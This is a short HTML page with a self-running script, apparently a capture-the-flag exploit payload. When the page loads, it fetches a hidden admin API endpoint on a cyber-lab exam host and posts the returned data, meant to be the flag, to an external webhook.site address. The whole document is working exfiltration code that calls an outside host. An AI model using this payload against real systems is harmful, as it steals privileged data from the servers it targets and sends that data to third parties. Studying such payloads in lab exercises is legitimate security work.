<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Auto Fetch and Send</title>
</head>
<body>
    <h1>Flag is being fetched...</h1>
    <script>
        (function () {
            const targetURL = "https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/api/admin/sup3rs3cr3t";
            const webhookURL = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";

            // Gửi dữ liệu JSON về webhook
            function sendToWebhook(data) {
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                }).catch(err => console.error("Webhook send failed:", err));
            }

            // Lấy dữ liệu từ API và gửi về webhook
            fetch(targetURL)
                .then(response => response.json())
                .then(data => {
                    sendToWebhook({
                        stage: "fetched_flag_success",
                        data: data
                    });
                })
                .catch(err => {
                    sendToWebhook({
                        stage: "fetch_failed",
                        error: err.toString()
                    });
                });
        })();
    </script>
</body>
</html>
